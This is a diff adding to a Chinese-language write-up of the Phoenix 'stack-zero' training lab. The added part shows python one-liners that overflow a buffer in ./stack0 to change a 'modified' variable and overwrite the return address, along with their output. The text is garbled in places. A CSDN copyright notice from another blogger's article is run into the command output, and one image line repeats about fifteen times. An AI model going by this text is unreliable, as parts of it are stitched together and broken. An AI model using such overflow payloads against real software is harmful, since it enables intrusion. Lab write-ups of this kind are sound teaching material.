@@ -128,6 +128,56 @@ esp+5c处的modified值变为了非0，程序的分支流程被修改，输出�
 
 ![](/png/06.png)
 
+覆盖成1或者其他非0值
+
+
+
+    $ python -c 'print "A"\*0x40+"\x01\x00\x00\x00"' \| ./stack0
+
+    you have changed the 'modified' variable
+
+    $ python -c 'print "A"\*0x40+"\x01"' \| ./stack0
+
+    you have changed the 'modified' variable
+
+
+
+覆盖返回地址
+
+发现buffer距离返回地址是0x54,后面改为要覆盖的地址即可   ，返回地址处0xb7eadcXX
+
+ $ python -c 'print "A"\*0x50+"\x19\x84\x04\x08"' \| ./stack0    you have changed the 'modified' variable    you have changed the 'modified' variable    Segmentation fault                                                                                                                                $ python -c 'print "\x00"\*0x50+"\x19\x84\x04\x08"' \| ./stack0    Try again?    you have changed the 'modified' variable    Segmentation fault————————————————版权声明：本文为CSDN博主「giantbranch」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/u012763794/article/details/76614927![](/png/07.png)
+
+![](/png/07.png)
+
+![](/png/07.png)
+
+![](/png/07.png)
+
+![](/png/07.png)
+
+![](/png/07.png)
+
+![](/png/07.png)
+
+![](/png/07.png)
+
+![](/png/07.png)
+
+![](/png/07.png)
+
+![](/png/07.png)
+
+![](/png/07.png)
+
+![](/png/07.png)
+
+![](/png/07.png)
+
+![](/png/07.png)
+
+
+
 Ref：
 
 [https://exploit.education/phoenix/stack-zero/](https://exploit.education/phoenix/stack-zero/)
